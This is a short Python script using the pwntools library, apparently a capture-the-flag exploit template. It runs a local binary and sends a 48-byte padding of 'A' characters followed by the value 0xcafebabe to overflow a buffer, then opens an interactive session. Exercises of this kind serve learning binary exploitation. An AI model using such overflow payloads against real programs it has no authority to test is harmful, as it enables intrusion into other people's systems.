        from pwn import *


        def start(argv=[], *a, **kw):
            return process([exe] + argv, *a, **kw)


        exe = sys.argv[1]
        elf = context.binary = ELF(exe, checksec=False)

        # ===========================================================
        #                           EXPLOIT
        # ===========================================================

        offset = 48
        io = start()

        payload = flat([
            b"A"*offset,
            0xcafebabe
        ])

        io.sendline(payload)
        io.interactive()
